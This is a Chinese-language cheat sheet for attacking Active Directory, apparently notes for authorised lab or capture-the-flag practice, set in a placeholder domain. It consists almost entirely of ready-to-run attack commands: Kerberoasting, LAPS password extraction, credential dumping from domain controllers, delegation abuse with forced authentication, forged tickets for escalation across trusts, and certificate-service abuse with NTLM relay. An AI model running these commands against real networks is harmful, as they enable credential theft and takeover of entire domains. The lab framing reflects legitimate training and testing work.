# Active Directory

::: warning 仅供学习 / 授权实验
示例域用 `corp.example`。不要把付费靶场主机名写进公开页。改了委派属性必须回滚。
:::

时钟偏差 < 5 分钟。访问用 FQDN，不用 IP。

## Linux 持票

```bash
export KRB5CCNAME=/home/kali/lab/tickets/current.ccache
klist -e
sudo ntpdate dc01.corp.example

smbclient -k -L //ws02.corp.example
impacket-wmiexec -k -no-pass CORP.EXAMPLE/USER@ws02.corp.example
impacket-secretsdump -k -no-pass dc01.corp.example
evil-winrm -i ws02.corp.example -k
```

```bash
impacket-getTGT 'CORP.EXAMPLE/USER:PASS' -dc-ip DC_IP
export KRB5CCNAME=$(pwd)/USER.ccache
impacket-ticketConverter kirbi.kirbi user.ccache
```

`KRB_AP_ERR_MODIFIED` → SPN / 加密类型 / 主机名。切换票必须重新 export + `klist`。

## 枚举

```bash
impacket-GetUserSPNs 'CORP.EXAMPLE/USER:PASS' -dc-ip DC_IP -request
impacket-GetNPUsers 'CORP.EXAMPLE/USER:PASS' -dc-ip DC_IP -request
ldapsearch -x -H ldap://dc01.corp.example -D 'CORP.EXAMPLE\\USER' -w 'PASS' \
  -b 'dc=corp,dc=example' '(objectClass=user)' sAMAccountName
netexec smb dc01.corp.example -u USER -p 'PASS' --users
certipy find -u USER@corp.example -p 'PASS' -dc-ip DC_IP -vulnerable -stdout
```

## LAPS

```bash
ldapsearch -x -H ldap://dc01.corp.example -D 'CORP.EXAMPLE\\USER' -w 'PASS' \
  -b 'dc=corp,dc=example' '(objectClass=computer)' \
  ms-Mcs-AdmPwd msLAPS-Password
impacket-wmiexec CORP.EXAMPLE/Administrator@ws02.corp.example -p 'LAPS_PASS'
```

密码是**那台机器的本地管理员**，不是域管。只开 WinRM → `evil-winrm`。

## 非约束委派

```powershell
Rubeus.exe monitor /interval:5 /nowrap
SpoolSample.exe DC01 $env:COMPUTERNAME
```

```bash
impacket-ticketConverter dc.kirbi dc.ccache
export KRB5CCNAME=dc.ccache
impacket-secretsdump -k -no-pass dc01.corp.example
```

Spooler 补丁了换 PetitPotam / DFSCoerce。抓到票就停 monitor。

## RBCD

```bash
impacket-addcomputer -computer-name 'FAKE01$' -computer-pass 'Fake#Passw0rd' \
  -dc-ip DC_IP 'CORP.EXAMPLE/USER:PASS'
# Windows 侧把 FAKE01$ SID 写入目标机 msDS-AllowedToActOnBehalfOfOtherIdentity
impacket-getST -spn cifs/ws02.corp.example -impersonate Administrator \
  -dc-ip DC_IP 'CORP.EXAMPLE/FAKE01$:Fake#Passw0rd'
export KRB5CCNAME=Administrator.ccache
impacket-wmiexec -k -no-pass CORP.EXAMPLE/Administrator@ws02.corp.example
```

做完回滚 `AllowedToAct`。MAQ=0 时用你已有凭据的带 SPN 账户当假主体。

## 约束委派

```bash
impacket-getST -spn cifs/ws02.corp.example -impersonate Administrator \
  -dc-ip DC_IP 'CORP.EXAMPLE/svc_sql:PASS'
export KRB5CCNAME=Administrator.ccache
impacket-wmiexec -k -no-pass CORP.EXAMPLE/Administrator@ws02.corp.example
```

```
Rubeus.exe s4u /user:svc_sql /password:PASS /impersonateuser:Administrator /msdsspn:cifs/ws02 /ptt
```

只能打 `AllowedToDelegateTo` 里的 SPN。

## Extra SID（林内父子信任）

先确认 `WITHIN_FOREST` 且方向允许。外部信任 SID 过滤默认开，别耗。

```bash
nltest /domain_trusts /all_trusts
impacket-ticketer -nthash CHILD_KRBTGT_NT -domain child.corp.example \
  -domain-sid S-1-5-21-CHILD \
  -extra-sid S-1-5-21-ROOT-519 Administrator
export KRB5CCNAME=Administrator.ccache
impacket-secretsdump -k -no-pass rootdc.corp.example
```

## ADCS

```bash
certipy find -u USER@corp.example -p 'PASS' -dc-ip DC_IP -vulnerable -stdout
# ESC1
certipy req -u USER@corp.example -p 'PASS' -ca 'CORP-CA' -target ca01.corp.example \
  -template 'VulnTemplate' -upn administrator@corp.example -out admin
certipy auth -pfx admin.pfx -dc-ip DC_IP -domain corp.example
# ESC8：中继到 Web Enrollment（HTTP 注册）
impacket-ntlmrelayx -t http://ca01.corp.example/certsrv/certfnsh.asp -smb2support --adcs
```

ESC1 四条：申请者可填 SAN、EKU 含客户端认证、低权可 enroll、无需经理审批。
